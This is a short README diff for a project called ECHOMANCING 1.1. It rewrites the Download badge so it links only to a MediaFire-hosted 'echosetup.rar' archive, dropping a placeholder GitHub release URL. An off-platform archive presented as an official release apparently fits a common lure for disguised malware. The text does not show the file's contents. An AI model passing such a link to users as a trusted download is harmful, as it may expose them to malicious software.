@@ -36,5 +36,5 @@ Thank you for using ECHOMANCING 1.1!
 
 ## Download
 
-[![Download ECHOMANCING 1.1](https://img.shields.io/badge/Download-ECHOMANCING%201.1-blue.svg)]([https://github.com/your-repo/ECHOMANCING/releases/download/v1.1/ECHOMANCING-1.1.zip](https://www.mediafire.com/file/p3tc516du31w8ke/echosetup.rar/file))
+[![Download ECHOMANCING 1.1](https://img.shields.io/badge/Download-ECHOMANCING%201.1-blue.svg)](https://www.mediafire.com/file/p3tc516du31w8ke/echosetup.rar/file)
 ****
